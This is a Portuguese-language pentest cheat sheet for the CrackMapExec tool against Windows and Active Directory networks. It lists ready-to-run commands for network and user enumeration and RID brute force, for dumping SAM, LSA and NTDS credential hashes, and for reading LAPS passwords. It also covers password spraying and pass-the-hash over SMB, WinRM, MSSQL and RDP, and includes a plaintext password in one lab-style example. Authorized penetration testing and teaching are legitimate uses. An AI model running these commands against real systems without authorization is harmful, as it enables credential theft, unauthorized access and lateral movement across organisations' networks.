Crackmapexec
========================

Quado se trata de pentest em ambientes Windows/Active Directory não podemos deixar de mencionar o [*crackmapexec*](https://github.com/byt3bl33d3r/CrackMapExec). Ela foi desenvolvida no para facilitar a vida do pentester varrer grandes redes sendo considerada o canivete suíço para tal fim. Mas, sem delongas, vamos demonstrar o poder dessa ferramenta e seus vários modos de uso e protocolos suportados...

## Uso genérico

    crackmapexec <protocolo> <opções_de_cada_protocolo>

*Vale considerar que para TODOS os comandos com <endereço_ip>, podemos substituí-lo por vários IPs separados ou notação de rede. Vide exemplos:*

    crackmapexec <protocolo> hostname.dominio
    
    crackmapexec <protocolo> 192.168.1.0 192.168.0.2
    
    crackmapexec <protocolo> 192.168.1.0/24
    
    crackmapexec <protocolo> 192.168.1.0-28 10.0.0.1-67
    
    crackmapexec <protocolo> ips.txt


## SMB

### Enumeracao

Enumeracao de hosts responsivos na rede:

    crackmapexec smb 192.168.1.0/24

Brute force de RID para enumerar usuarios:

    crackmapexec smb 192.168.1.0/24 -u usuario -p 'senha' --rid-brute

Enumerar usuarios de dominio

    crackmapexec smb 192.168.1.0/24 -u usuario -p 'senha' --users

Obter compartilhamentos via null session

    crackmapexec smb <endereço_ip> --shares

ou

    crackmapexec smb <endereco_ip> -u usuario -p senha --shares

Obter política de senhas via null session

    crackmapexec smb <endereço_ip> --pass-pol

### Com usuário privilegiado

Usuário administrador local:

    crackmapexec smb <endereço_ip> -u Administrator -p <senha> --local-auth

Com usuário de domínio:

    crackmapexec smb <endereço_ip> -d <domínio> -u <usuario> -p <senha>

Quando obtido **Pwn3d!** no output da ferramenta, significa que temos privilégios no host alvo, sendo possível a extração dos hashes de senha da máquina:

    crackmapexec smb <endereço_ip> -u <usuario> -p <senha> --sam 

Outra opção seria de fazer o dump do lsass:

    crackmapexec smb <endereço_ip> -u <usuario> -p <senha> --lsa

No controlador de domínio podemos considerar este comando (já com credencial domain admin ou similares)

    crackmapexec smb <endereço_ip> -u <usuario> -p <senha> --ntds

## LAPS

read LAPS passwords (necessário ter permissão pe LAPS_Readers):

    crackmapexec ldap 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV' -M laps


## Password spraying

    crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
    
    crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
    
    crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue

## Pass the hash

    crackmapexec ldap hosts.txt -u users.txt -H :<nthash> --continue
    
    crackmapexec smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    crackmapexec rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>